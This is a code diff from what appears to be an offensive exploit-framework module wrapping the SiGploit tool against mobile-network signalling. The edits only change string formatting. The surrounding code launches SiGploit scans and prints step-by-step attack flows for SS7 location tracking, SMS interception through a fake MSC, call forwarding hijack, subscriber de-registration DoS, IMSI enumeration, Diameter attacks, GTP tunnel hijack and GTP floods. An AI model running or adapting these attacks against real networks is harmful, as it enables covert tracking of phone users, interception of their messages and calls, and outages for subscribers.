@@ -175,10 +175,10 @@ class Exploit(Exploit):
         cmd_str = " ".join(cmd)
 
         if self.dry_run:
-            print_info("DRY RUN - {}".format(cmd_str))
+            print_info(f"DRY RUN - {cmd_str}")
             return
 
-        print_status("{}: {}".format(label, cmd_str))
+        print_status(f"{label}: {cmd_str}")
         try:
             result = subprocess.run(
                 cmd, cwd=str(sp_root), capture_output=True,
@@ -186,21 +186,21 @@ class Exploit(Exploit):
             )
             if result.stdout.strip():
                 for line in result.stdout.strip().splitlines():
-                    print_info("  {}".format(line))
+                    print_info(f"  {line}")
             if result.returncode != 0 and result.stderr.strip():
-                print_error("stderr: {}".format(result.stderr.strip()))
+                print_error(f"stderr: {result.stderr.strip()}")
 
             outdir = self._outdir()
             report = os.path.join(outdir, "sigploit_{}.txt".format(label.lower().replace(" ", "_")))
             with open(report, "w", encoding="utf-8") as fh:
-                fh.write("Command: {}\n".format(cmd_str))
-                fh.write("Exit code: {}\n\n".format(result.returncode))
+                fh.write(f"Command: {cmd_str}\n")
+                fh.write(f"Exit code: {result.returncode}\n\n")
                 fh.write(result.stdout)
-            print_info("Output saved: {}".format(report))
+            print_info(f"Output saved: {report}")
         except subprocess.TimeoutExpired:
             print_error("SiGploit timed out (120s limit).")
         except Exception as exc:
-            print_error("SiGploit error: {}".format(exc))
+            print_error(f"SiGploit error: {exc}")
 
     def _info_mode(self) -> None:
         print_status("SS7/Diameter/GTP Protocol Attack Overview")
@@ -248,7 +248,7 @@ class Exploit(Exploit):
             return
         gt = str(self.attacker_gt).strip()
         print_status("SS7 Location Tracking via MAP SendRoutingInfo + ProvideSubscriberInfo")
-        print_info("Target MSISDN: {}".format(msisdn))
+        print_info(f"Target MSISDN: {msisdn}")
         print_info("Attacker GT: {}".format(gt or "(not set)"))
         print_info(
             "Attack flow:\n"
@@ -276,8 +276,8 @@ class Exploit(Exploit):
             print_error("attacker_gt is required (fake MSC/VLR address)")
             return
         print_status("SS7 SMS Interception via MAP UpdateLocation")
-        print_info("Target MSISDN: {}".format(msisdn))
-        print_info("Attacker GT (fake MSC): {}".format(attacker))
+        print_info(f"Target MSISDN: {msisdn}")
+        print_info(f"Attacker GT (fake MSC): {attacker}")
         print_info(
             "Attack flow:\n"
             "  1. MAP UpdateLocation(IMSI, attacker_GT) to victim's HLR\n"
@@ -303,7 +303,7 @@ class Exploit(Exploit):
             print_error("target_msisdn and attacker_msisdn are required")
             return
         print_status("SS7 Call Redirect via InsertSubscriberData / RegisterSS")
-        print_info("Target: {} -> Redirect to: {}".format(msisdn, redirect_to))
+        print_info(f"Target: {msisdn} -> Redirect to: {redirect_to}")
         print_info(
             "Attack flow:\n"
             "  1. MAP InsertSubscriberData with CFU (Call Forward Unconditional)\n"
@@ -330,7 +330,7 @@ class Exploit(Exploit):
             return
         target_id = imsi or msisdn
         print_status("SS7 DoS via CancelLocation / PurgeMS")
-        print_info("Target: {}".format(target_id))
+        print_info(f"Target: {target_id}")
         print_info(
             "Attack flow:\n"
             "  1. MAP CancelLocation(IMSI) -> de-register subscriber from VLR\n"
@@ -354,7 +354,7 @@ class Exploit(Exploit):
             print_error("target_msisdn is required for IMSI enumeration")
             return
         print_status("SS7 IMSI Enumeration via SendRoutingInfoForSM")
-        print_info("Target MSISDN: {}".format(msisdn))
+        print_info(f"Target MSISDN: {msisdn}")
         print_info(
             "Attack flow:\n"
             "  1. MAP SendRoutingInfoForSM(MSISDN)\n"
@@ -378,7 +378,7 @@ class Exploit(Exploit):
             print_error("target_imsi is required for Diameter location tracking")
             return
         print_status("Diameter Location Tracking (4G/5G equivalent of SS7)")
-        print_info("Target IMSI: {}".format(imsi))
+        print_info(f"Target IMSI: {imsi}")
         print_info(
             "Attack flow:\n"
             "  1. Diameter CLR/IDR on S6a interface to HSS\n"
@@ -398,9 +398,7 @@ class Exploit(Exploit):
         if not sp or not self._require_target():
             return
         print_status("Diameter DoS and Fuzzing")
-        print_info("Target: {}:{}".format(
-            str(self.target_host).strip(), int(self.target_port)
-        ))
+        print_info(f"Target: {str(self.target_host).strip()}:{int(self.target_port)}")
         print_info(
             "Attack vectors:\n"
             "  1. Malformed AVP (Attribute-Value Pair) messages\n"
@@ -420,9 +418,7 @@ class Exploit(Exploit):
         if not sp or not self._require_target():
             return
         print_status("GTP Tunnel Hijack for Traffic Interception")
-        print_info("Target: {}:{}".format(
-            str(self.target_host).strip(), int(self.target_port)
-        ))
+        print_info(f"Target: {str(self.target_host).strip()}:{int(self.target_port)}")
         print_info(
             "Attack flow:\n"
             "  1. GTP-C: send Create/Modify PDP Context with spoofed TEID\n"
@@ -442,9 +438,7 @@ class Exploit(Exploit):
         if not sp or not self._require_target():
             return
         print_status("GTP Flood / DoS Attack")
-        print_info("Target: {}:{}".format(
-            str(self.target_host).strip(), int(self.target_port)
-        ))
+        print_info(f"Target: {str(self.target_host).strip()}:{int(self.target_port)}")
         print_info(
             "Attack vectors:\n"
             "  1. GTP-C Echo Request flood (control plane exhaustion)\n"
@@ -467,22 +461,20 @@ class Exploit(Exploit):
         if proto not in self._VALID_PROTOCOLS:
             print_error("protocol must be: {}".format(", ".join(sorted(self._VALID_PROTOCOLS))))
             return
-        print_status("Scanning {} exposure on {}:{}".format(
-            proto.upper(), str(self.target_host).strip(), int(self.target_port)
-        ))
+        print_status(f"Scanning {proto.upper()} exposure on {str(self.target_host).strip()}:{int(self.target_port)}")
         print_info(
-            "Testing if target PLMN is vulnerable to common {} vectors:\n"
+            f"Testing if target PLMN is vulnerable to common {proto.upper()} vectors:\n"
             "  - Message filtering and firewalling\n"
             "  - Category/OpCode restrictions\n"
             "  - Source GT/realm validation\n"
-            "  - Rate limiting on signaling messages".format(proto.upper())
+            "  - Rate limiting on signaling messages"
         )
         args = [
             "--mode", proto, "--attack", "scan",
             "--host", str(self.target_host).strip(),
             "--port", str(int(self.target_port)),
         ]
-        self._run_sigploit_cmd(sp, args, "Exposure Scan ({})".format(proto.upper()))
+        self._run_sigploit_cmd(sp, args, f"Exposure Scan ({proto.upper()})")
 
     def _cve_database(self) -> None:
         print_status("SS7/Diameter/GTP - CVE and Research Database (2020-2026)")
